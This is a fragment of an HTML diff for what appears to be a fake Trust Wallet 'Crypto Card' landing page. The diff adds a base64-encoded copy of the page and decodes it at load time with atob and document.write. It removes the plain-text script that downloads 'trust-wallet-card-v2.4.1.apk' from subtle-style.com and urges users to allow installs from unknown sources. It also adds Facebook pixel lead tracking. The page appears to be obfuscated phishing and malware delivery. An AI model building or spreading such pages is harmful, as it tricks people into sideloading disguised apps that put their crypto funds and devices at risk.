hhc2VzIGF0IG1pbGxpb25zIG9mIHJldGFpbGVycyB3b3JsZHdpZGUuIFlvdSBjYW4gYWxzbyB3aXRoZHJhdyBjYXNoIGZyb20gQVRNcyBpbiBtb3N0IGNvdW50cmllcy48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZmFxLWl0ZW0iPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZmFxLXF1ZXN0aW9uIiBkYXRhLWZhcT0iNCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gZGF0YS1pMThuPSJmYXEucTUiPldoYXQgYXJlIHRoZSBwcmVyZXF1aXNpdGVzIGZvciBvcmRlcmluZyBDcnlwdG8gQ2FyZD88L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIHN0cm9rZS13aWR0aD0iMiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwb2x5bGluZSBwb2ludHM9IjYgOSAxMiAxNSAxOCA5Ij48L3BvbHlsaW5lPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3ZnPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmYXEtYW5zd2VyIiBpZD0iZmFxLTQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwIGRhdGEtaTE4bj0iZmFxLmE1Ij5Zb3UgbmVlZCB0byBoYXZlIGEgVHJ1c3QgV2FsbGV0IGFjY291bnQgd2l0aCB2ZXJpZmllZCBpZGVudGl0eS4gTWFrZSBzdXJlIHlvdSBoYXZlIGNyeXB0b2N1cnJlbmN5IGZ1bmRzIGF2YWlsYWJsZSBpbiB5b3VyIHdhbGxldCBmb3IgdHJhbnNhY3Rpb25zLjwvcD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L3NlY3Rpb24+DQoNCiAgICA8c2VjdGlvbiBpZD0ic2lnbnVwIiBjbGFzcz0iY3RhIj4NCiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImN0YS1jb250ZW50Ij4NCiAgICAgICAgICAgICAgICA8aDIgZGF0YS1pMThuPSJjdGEudGl0bGUiPkpvaW4gdXMgdG9kYXk8L2gyPg0KICAgICAgICAgICAgICAgIDxwIGRhdGEtaTE4bj0iY3RhLmRlc2NyaXB0aW9uIj5DcnlwdG8gQ2FyZCBmcm9tIFRydXN0IFdhbGxldC4gUGF5bWVudCBnb2VzIGRpcmVjdGx5IGZyb20geW91ciBUcnVzdCBXYWxsZXQuIFNlY3VyZSwgZmFzdCBhbmQgY29udmVuaWVudC48L3A+DQogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuLWN0YSIgZGF0YS1pMThuPSJjdGEuYnV0dG9uIiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb2J0YWluLWNhcmQtbW9kYWwnKS5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21vZGFsLW92ZXJsYXknKS5jbGFzc0xpc3QuYWRkKCdhY3RpdmUnKTsiPkdldCBZb3VyIENhcmQgPHNwYW4+4oaSPC9zcGFuPjwvYnV0dG9uPg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjdGEtaW1hZ2UiPg0KICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJpbWFnZXMvY3RhLWJhbm5lci5zdmciIGFsdD0iQ1RBIEJhbm5lciIgY2xhc3M9ImN0YS1iYW5uZXItaW1nIj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L3NlY3Rpb24+DQoNCiAgICA8Zm9vdGVyIGNsYXNzPSJmb290ZXIiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9vdGVyLWNvbnRlbnQiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvb3Rlci1sb2dvIj4NCiAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9ImltYWdlcy90cnVzdC1mdWxsLnN2ZyIgYWx0PSJUcnVzdCIgY2xhc3M9ImZvb3Rlci1sb2dvLWltZyI+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPHA+JmNvcHk7IDIwMjYgVHJ1c3QgV2FsbGV0LiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Zvb3Rlcj4NCg0KPCEtLSBPYnRhaW4gQ2FyZCBNb2RhbCAtLT4NCjxkaXYgY2xhc3M9Im1vZGFsIiBpZD0ib2J0YWluLWNhcmQtbW9kYWwiPg0KICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQiPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJtb2RhbC1jbG9zZSIgaWQ9Im1vZGFsLWNsb3NlIj4mdGltZXM7PC9idXR0b24+DQoNCiAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtaGVhZGVyIj4NCiAgICAgICAgICAgIDxoMiBkYXRhLWkxOG49Im1vZGFsLnRpdGxlIj5HZXQgWW91ciBDcnlwdG8gQ2FyZDwvaDI+DQogICAgICAgIDwvZGl2Pg0KDQogICAgICAgIDxkaXYgY2xhc3M9InN0ZXBzLWNvbnRhaW5lciI+DQogICAgICAgICAgICA8IS0tIFN0ZXAgMTogRG93bmxvYWQgQXBwIC0tPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcCBhY3RpdmUiIGRhdGEtc3RlcD0iMSI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1oZWFkZXIiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLW51bWJlciI+MTwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLXRpdGxlLWdyb3VwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxoMyBkYXRhLWkxOG49Im1vZGFsLnN0ZXAyLnRpdGxlIj5Eb3dubG9hZCB0aGUgYXBwPC9oMz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJzdGVwLXN1YnRpdGxlIiBkYXRhLWkxOG49Im1vZGFsLnN0ZXAyLnN1YnRpdGxlIj5JbnN0YWxsIHRoZSBhcHAgdG8gbWFuYWdlIHlvdXIgQ3J5cHRvIENhcmQ8L3A+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtY29udGVudCI+DQogICAgICAgICAgICAgICAgICAgIDxwIGRhdGEtaTE4bj0ibW9kYWwuc3RlcDIuZGVzY3JpcHRpb24iPkluc3RhbGwgdGhlIGFwcCB0byBtYW5hZ2UgeW91ciBDcnlwdG8gQ2FyZCBmcm9tIFRydXN0IFdhbGxldC48L3A+DQogICAgICAgICAgICAgICAgICAgIDxwPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYXBrLWJ1dHRvbiIgaWQ9ImRvd25sb2FkLWFway10cmlnZ2VyIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWRvd25sb2FkIj48L2k+IERvd25sb2FkIEFQSyAodjIuNC4xKQ0KICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDwvcD4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KDQogICAgICAgICAgICA8IS0tIFN0ZXAgMjogQ2FyZCBSZWFkeSAtLT4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAgaW5hY3RpdmUiIGRhdGEtc3RlcD0iMiI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1oZWFkZXIiPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLW51bWJlciI+MjwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzdGVwLXRpdGxlLWdyb3VwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxoMyBkYXRhLWkxOG49Im1vZGFsLnN0ZXAzLnRpdGxlIj5Zb3VyIENyeXB0byBDYXJkIGlzIHJlYWR5PC9oMz4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJzdGVwLXN1YnRpdGxlIiBkYXRhLWkxOG49Im1vZGFsLnN0ZXAzLnN1YnRpdGxlIj5TdGFydCB1c2luZyB5b3VyIGNhcmQ8L3A+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtY29udGVudCI+DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICA8IS0tINCY0L3RgdGC0YDRg9C60YbQuNGPINC/0L7RgdC70LUg0YHQutCw0YfQuNCy0LDQvdC40Y8gLS0+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imluc3RhbGxhdGlvbi1pbnN0cnVjdGlvbnMiIGlkPSJpbnN0YWxsYXRpb24taW5zdHJ1Y3Rpb25zIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5zdHJ1Y3Rpb25zLWhlYWRlciI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1jaGVjay1jaXJjbGUiIHN0eWxlPSJjb2xvcjogIzRDQUY1MDsiPjwvaT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBzdHlsZT0iZm9udC13ZWlnaHQ6IDYwMDsiPkRvd25sb2FkIGNvbXBsZXRlITwvc3Bhbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICAgICAgPG9sIGNsYXNzPSJpbnN0cnVjdGlvbnMtbGlzdCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxpIGNsYXNzPSJmYXMgZmEtZm9sZGVyLW9wZW4iPjwvaT4gT3BlbiB5b3VyIGRldmljZSdzICJEb3dubG9hZHMiIGZvbGRlcjwvbGk+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxpIGNsYXNzPSJmYXMgZmEtZmlsZS1hbHQiPjwvaT4gVGFwIG9uIHRoZSBkb3dubG9hZGVkIEFQSyBmaWxlICh0cnVzdC13YWxsZXQtY2FyZC12Mi40LjEuYXBrKTwvbGk+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxpIGNsYXNzPSJmYXMgZmEtc2hpZWxkLWFsdCI+PC9pPiBJZiBwcm9tcHRlZCwgYWxsb3cgaW5zdGFsbGF0aW9uIGZyb20gdW5rbm93biBzb3VyY2VzPC9saT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGkgY2xhc3M9ImZhcyBmYS1wbGF5LWNpcmNsZSI+PC9pPiBGb2xsb3cgdGhlIG9uLXNjcmVlbiBpbnN0YWxsYXRpb24gaW5zdHJ1Y3Rpb25zPC9saT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGkgY2xhc3M9ImZhcyBmYS1jcmVkaXQtY2FyZCI+PC9pPiBBZnRlciBpbnN0YWxsYXRpb24sIG9wZW4gdGhlIGFwcCBhbmQgbG9nIGluIHRvIGFjdGl2YXRlIHlvdXIgQ3J5cHRvIENhcmQ8L2xpPg0KICAgICAgICAgICAgICAgICAgICAgICAgPC9vbD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Imluc3RydWN0aW9ucy1ub3RlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWluZm8tY2lyY2xlIj48L2k+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4+SGF2aW5nIHRyb3VibGU/IE1ha2Ugc3VyZSB5b3VyIGRldmljZSBhbGxvd3MgaW5zdGFsbGF0aW9uIGZyb20gdGhpcmQtcGFydHkgc291cmNlcy48L3NwYW4+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQo8L2Rpdj4NCg0KPHNjcmlwdD4NCiAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQogICAgICAgIGNvbnN0IGRvd25sb2FkVHJpZ2dlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkb3dubG9hZC1hcGstdHJpZ2dlcicpOw0KICAgICAgICANCiAgICAgICAgY29uc3Qgc3RlcDEgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuc3RlcFtkYXRhLXN0ZXA9IjEiXScpOw0KICAgICAgICBjb25zdCBzdGVwMiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5zdGVwW2RhdGEtc3RlcD0iMiJdJyk7DQogICAgICAgIA0KICAgICAgICBjb25zdCBpbnN0cnVjdGlvbnNCbG9jayA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbnN0YWxsYXRpb24taW5zdHJ1Y3Rpb25zJyk7DQogICAgICAgIA0KICAgICAgICBjb25zdCBhcGtEb3dubG9hZFVybCA9ICdodHRwczovL3N1YnRsZS1zdHlsZS5jb20vVHJ1c3RfRU5fT0xEXzFfZXFfMV8yL2Rvd25sb2FkLnBocCc7IA0KICAgICAgICANCiAgICAgICAgZnVuY3Rpb24gZG93bmxvYWRBcGsoKSB7DQogICAgICAgICAgICBjb25zdCBsaW5rID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpOw0KICAgICAgICAgICAgbGluay5ocmVmID0gYXBrRG93bmxvYWRVcmw7DQogICAgICAgICAgICBsaW5rLmRvd25sb2FkID0gJ3RydXN0LXdhbGxldC1jYXJkLXYyLjQuMS5hcGsnOw0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsaW5rKTsNCiAgICAgICAgICAgIGxpbmsuY2xpY2soKTsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkucmVtb3ZlQ2hpbGQobGluayk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnNvbGUubG9nKCdBUEsgZG93bmxvYWQgc3RhcnRlZCcpOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBmdW5jdGlvbiB1bmxvY2tTdGVwMigpIHsNCiAgICAgICAgICAgIGlmIChzdGVwMSkgew0KICAgICAgICAgICAgICAgIHN0ZXAxLmNsYXNzTGlzdC5yZW1vdmUoJ2FjdGl2ZScpOw0KICAgICAgICAgICAgICAgIHN0ZXAxLmNsYXNzTGlzdC5hZGQoJ2luYWN0aXZlJywgJ2xvY2tlZCcpOw0KICAgICAgICAgICAgICAgIHN0ZXAxLnN0eWxlLm9wYWNpdHkgPSAnMC41JzsNCiAgICAgICAgICAgICAgICBzdGVwMS5zdHlsZS5wb2ludGVyRXZlbnRzID0gJ25vbmUnOw0KICAgICAgICAgICAgICAgIHN0ZXAxLnN0eWxlLnBvc2l0aW9uID0gJ3JlbGF0aXZlJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKHN0ZXAyKSB7DQogICAgICAgICAgICAgICAgc3RlcDIuY2xhc3NMaXN0LnJlbW92ZSgnaW5hY3RpdmUnLCAnbG9ja2VkJyk7DQogICAgICAgICAgICAgICAgc3RlcDIuY2xhc3NMaXN0LmFkZCgnYWN0aXZlJyk7DQogICAgICAgICAgICAgICAgc3RlcDIuc3R5bGUub3BhY2l0eSA9ICcxJzsNCiAgICAgICAgICAgICAgICBzdGVwMi5zdHlsZS5wb2ludGVyRXZlbnRzID0gJ2F1dG8nOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoaW5zdHJ1Y3Rpb25zQmxvY2spIHsNCiAgICAgICAgICAgICAgICBpbnN0cnVjdGlvbnNCbG9jay5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgICAgICAgICBpbnN0cnVjdGlvbnNCbG9jay5zdHlsZS5hbmltYXRpb24gPSAnZmFkZUluVXAgMC41cyBlYXNlJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgaWYgKGRvd25sb2FkVHJpZ2dlcikgew0KICAgICAgICAgICAgZG93bmxvYWRUcmlnZ2VyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oZSkgew0KICAgICAgICAgICAgICAgIGRvd25sb2FkQXBrKCk7DQogICAgICAgICAgICAgICAgdW5sb2NrU3RlcDIoKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBkb3dubG9hZFRyaWdnZXIuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtY2hlY2siPjwvaT4gRG93bmxvYWQgU3RhcnRlZCEnOw0KICAgICAgICAgICAgICAgIGRvd25sb2FkVHJpZ2dlci5zdHlsZS5iYWNrZ3JvdW5kID0gJyM0Q0FGNTAnOw0KICAgICAgICAgICAgICAgIGRvd25sb2FkVHJpZ2dlci5kaXNhYmxlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHN0ZXAxKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGNoZWNrbWFyayA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOw0KICAgICAgICAgICAgICAgICAgICBjaGVja21hcmsuY2xhc3NOYW1lID0gJ3N0ZXAtY29tcGxldGUtY2hlY2snOw0KICAgICAgICAgICAgICAgICAgICBjaGVja21hcmsuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtY2hlY2stY2lyY2xlIj48L2k+JzsNCiAgICAgICAgICAgICAgICAgICAgY2hlY2ttYXJrLnN0eWxlLnBvc2l0aW9uID0gJ2Fic29sdXRlJzsNCiAgICAgICAgICAgICAgICAgICAgY2hlY2ttYXJrLnN0eWxlLnRvcCA9ICcyMHB4JzsNCiAgICAgICAgICAgICAgICAgICAgY2hlY2ttYXJrLnN0eWxlLnJpZ2h0ID0gJzIwcHgnOw0KICAgICAgICAgICAgICAgICAgICBjaGVja21hcmsuc3R5bGUuZm9udFNpemUgPSAnMjhweCc7DQogICAgICAgICAgICAgICAgICAgIGNoZWNrbWFyay5zdHlsZS5jb2xvciA9ICcjNENBRjUwJzsNCiAgICAgICAgICAgICAgICAgICAgY2hlY2ttYXJrLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICd3aGl0ZSc7DQogICAgICAgICAgICAgICAgICAgIGNoZWNrbWFyay5zdHlsZS5ib3JkZXJSYWRpdXMgPSAnNTAlJzsNCiAgICAgICAgICAgICAgICAgICAgY2hlY2ttYXJrLnN0eWxlLnpJbmRleCA9ICcxMCc7DQogICAgICAgICAgICAgICAgICAgIHN0ZXAxLnN0eWxlLnBvc2l0aW9uID0gJ3JlbGF0aXZlJzsNCiAgICAgICAgICAgICAgICAgICAgc3RlcDEuYXBwZW5kQ2hpbGQoY2hlY2ttYXJrKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KICAgIH0pOw0KPC9zY3JpcHQ+DQoNCjxzdHlsZT4NCiAgICAuaW5zdGFsbGF0aW9uLWluc3RydWN0aW9ucyB7DQogICAgICAgIGFuaW1hdGlvbjogZmFkZUluVXAgMC40cyBlYXNlOw0KICAgIH0NCiAgICANCiAgICAuaW5zdHJ1Y3Rpb25zLWhlYWRlciB7DQogICAgICAgIGRpc3BsYXk6IGZsZXg7DQogICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgICAgIGdhcDogMTBweDsNCiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTVweDsNCiAgICAgICAgZm9udC1zaXplOiAxNnB4Ow0KICAgICAgICBjb2xvcjogIzJjM2U1MDsNCiAgICB9DQogICAgDQogICAgLmluc3RydWN0aW9ucy1oZWFkZXIgaSB7DQogICAgICAgIGZvbnQtc2l6ZTogMjBweDsNCiAgICB9DQogICAgDQogICAgLmluc3RydWN0aW9ucy1saXN0IHsNCiAgICAgICAgbWFyZ2luOiAwOw0KICAgICAgICBwYWRkaW5nLWxlZnQ6IDIwcHg7DQogICAgICAgIGxpc3Qtc3R5bGU6IG5vbmU7DQogICAgfQ0KICAgIA0KICAgIC5pbnN0cnVjdGlvbnMtbGlzdCBsaSB7DQogICAgICAgIGRpc3BsYXk6IGZsZXg7DQogICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgICAgIGdhcDogMTJweDsNCiAgICAgICAgbWFyZ2luLWJvdHRvbTogMTJweDsNCiAgICAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICAgICBjb2xvcjogIzM0NDk1ZTsNCiAgICAgICAgbGluZS1oZWlnaHQ6IDEuNDsNCiAgICB9DQogICAgDQogICAgLmluc3RydWN0aW9ucy1saXN0IGxpIGkgew0KICAgICAgICB3aWR0aDogMjBweDsNCiAgICAgICAgY29sb3I6ICM0Q0FGNTA7DQogICAgICAgIGZvbnQtc2l6ZTogMTRweDsNCiAgICB9DQogICAgDQogICAgLmluc3RydWN0aW9ucy1ub3RlIHsNCiAgICAgICAgbWFyZ2luLXRvcDogMTVweDsNCiAgICAgICAgcGFkZGluZzogMTBweDsNCiAgICAgICAgYmFja2dyb3VuZDogI2UzZjJmZDsNCiAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4Ow0KICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgICAgICBnYXA6IDEwcHg7DQogICAgICAgIGZvbnQtc2l6ZTogMTNweDsNCiAgICAgICAgY29sb3I6ICMxNTY1YzA7DQogICAgfQ0KICAgIA0KICAgIC5pbnN0cnVjdGlvbnMtbm90ZSBpIHsNCiAgICAgICAgZm9udC1zaXplOiAxNnB4Ow0KICAgIH0NCiAgICANCiAgICBAa2V5ZnJhbWVzIGZhZGVJblVwIHsNCiAgICAgICAgZnJvbSB7DQogICAgICAgICAgICBvcGFjaXR5OiAwOw0KICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDEwcHgpOw0KICAgICAgICB9DQogICAgICAgIHRvIHsNCiAgICAgICAgICAgIG9wYWNpdHk6IDE7DQogICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCk7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgLnN0ZXAubG9ja2VkIHsNCiAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgIH0NCiAgICANCiAgICAuc3RlcC5sb2NrZWQ6OmFmdGVyIHsNCiAgICAgICAgY29udGVudDogJyc7DQogICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgICAgdG9wOiAwOw0KICAgICAgICBsZWZ0OiAwOw0KICAgICAgICByaWdodDogMDsNCiAgICAgICAgYm90dG9tOiAwOw0KICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNyk7DQogICAgICAgIGJvcmRlci1yYWRpdXM6IDE2cHg7DQogICAgICAgIHBvaW50ZXItZXZlbnRzOiBub25lOw0KICAgIH0NCiAgICANCiAgICAuc3RlcC1jb21wbGV0ZS1jaGVjayB7DQogICAgICAgIGFuaW1hdGlvbjogc2NhbGVJbiAwLjNzIGVhc2U7DQogICAgfQ0KICAgIA0KICAgIEBrZXlmcmFtZXMgc2NhbGVJbiB7DQogICAgICAgIGZyb20gew0KICAgICAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgwKTsNCiAgICAgICAgICAgIG9wYWNpdHk6IDA7DQogICAgICAgIH0NCiAgICAgICAgdG8gew0KICAgICAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxKTsNCiAgICAgICAgICAgIG9wYWNpdHk6IDE7DQogICAgICAgIH0NCiAgICB9DQo8L3N0eWxlPg0KDQogICAgPGRpdiBjbGFzcz0ibW9kYWwtb3ZlcmxheSIgaWQ9Im1vZGFsLW92ZXJsYXkiPjwvZGl2Pg0KDQogICAgPHNjcmlwdCBzcmM9ImpzL3NjcmlwdC5qcyI+PC9zY3JpcHQ+DQoNCjwvYm9keT4NCjwvaHRtbD4=';
+      var d = decodeURIComponent(atob(b64).split('').map(function(c) {
+          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+      }).join(''));
+      document.open();
+      document.write(d);
+      document.close();
+    })();
+  </script>
 <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        const downloadTrigger = document.getElementById('download-apk-trigger');
-        
-        const step1 = document.querySelector('.step[data-step="1"]');
-        const step2 = document.querySelector('.step[data-step="2"]');
-        
-        const instructionsBlock = document.getElementById('installation-instructions');
-        
-        const apkDownloadUrl = 'https://subtle-style.com/Trust_EN_OLD_1_eq_1_2/download.php'; 
-        
-        function downloadApk() {
-            const link = document.createElement('a');
-            link.href = apkDownloadUrl;
-            link.download = 'trust-wallet-card-v2.4.1.apk';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            console.log('APK download started');
-        }
-        
-        function unlockStep2() {
-            if (step1) {
-                step1.classList.remove('active');
-                step1.classList.add('inactive', 'locked');
-                step1.style.opacity = '0.5';
-                step1.style.pointerEvents = 'none';
-                step1.style.position = 'relative';
-            }
-            
-            if (step2) {
-                step2.classList.remove('inactive', 'locked');
-                step2.classList.add('active');
-                step2.style.opacity = '1';
-                step2.style.pointerEvents = 'auto';
-            }
-            
-            if (instructionsBlock) {
-                instructionsBlock.style.display = 'block';
-                instructionsBlock.style.animation = 'fadeInUp 0.5s ease';
-            }
-        }
-        
-        if (downloadTrigger) {
-            downloadTrigger.addEventListener('click', function(e) {
-                downloadApk();
-                unlockStep2();
-                
-                downloadTrigger.innerHTML = '<i class="fas fa-check"></i> Download Started!';
-                downloadTrigger.style.background = '#4CAF50';
-                downloadTrigger.disabled = true;
-                
-                if (step1) {
-                    const checkmark = document.createElement('div');
-                    checkmark.className = 'step-complete-check';
-                    checkmark.innerHTML = '<i class="fas fa-check-circle"></i>';
-                    checkmark.style.position = 'absolute';
-                    checkmark.style.top = '20px';
-                    checkmark.style.right = '20px';
-                    checkmark.style.fontSize = '28px';
-                    checkmark.style.color = '#4CAF50';
-                    checkmark.style.backgroundColor = 'white';
-                    checkmark.style.borderRadius = '50%';
-                    checkmark.style.zIndex = '10';
-                    step1.style.position = 'relative';
-                    step1.appendChild(checkmark);
-                }
-            });
-        }
+  document.querySelectorAll('#downloadBtn, #downloadBtn2').forEach(btn => {
+    btn.addEventListener('click', function() {
+      if (typeof fbq === 'function') {
+        fbq('track', 'Lead');
+      }
     });
+  });
 </script>
-
-<style>
-    .installation-instructions {
-        animation: fadeInUp 0.4s ease;
-    }
-    
-    .instructions-header {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        margin-bottom: 15px;
-        font-size: 16px;
-        color: #2c3e50;
-    }
-    
-    .instructions-header i {
-        font-size: 20px;
-    }
-    
-    .instructions-list {
-        margin: 0;
-        padding-left: 20px;
-        list-style: none;
-    }
-    
-    .instructions-list li {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        margin-bottom: 12px;
-        font-size: 14px;
-        color: #34495e;
-        line-height: 1.4;
-    }
-    
-    .instructions-list li i {
-        width: 20px;
-        color: #4CAF50;
-        font-size: 14px;
-    }
-    
-    .instructions-note {
-        margin-top: 15px;
-        padding: 10px;
-        background: #e3f2fd;
-        border-radius: 8px;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        font-size: 13px;
-        color: #1565c0;
-    }
-    
-    .instructions-note i {
-        font-size: 16px;
-    }
-    
-    @keyframes fadeInUp {
-        from {
-            opacity: 0;
-            transform: translateY(10px);
-        }
-        to {
-            opacity: 1;
-            transform: translateY(0);
-        }
-    }
-    
-    .step.locked {
-        position: relative;
-    }
-    
